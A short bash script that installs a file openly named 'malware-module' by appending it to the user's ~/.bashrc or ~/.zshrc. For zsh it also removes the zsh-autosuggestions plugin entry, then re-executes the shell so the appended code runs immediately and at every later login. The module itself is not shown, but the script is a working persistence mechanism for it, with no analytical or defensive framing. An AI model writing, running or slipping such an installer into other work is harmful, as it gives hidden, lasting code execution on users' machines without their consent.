#!/bin/bash

shell_name=$(basename "$SHELL")

if [[ "$shell_name" == "bash" ]]; then
  cp ~/.bashrc ~/.bashrc.bak
  cat ./malware-module >> ~/.bashrc
  exec bash
elif [[ "$shell_name" == "zsh" ]]; then
  cp ~/.zshrc ~/.zshrc.bak

  if [[ "$OSTYPE" == "darwin"* ]]; then
    sed -i '' -e 's/zsh-autosuggestions//g' ~/.zshrc
  else
    sed -i -e 's/zsh-autosuggestions//g' ~/.zshrc
  fi

  cat ./malware-module >> ~/.zshrc
  exec zsh
else
  echo "Unsupported shell: $shell_name. Alas :("
  exit 1
fi

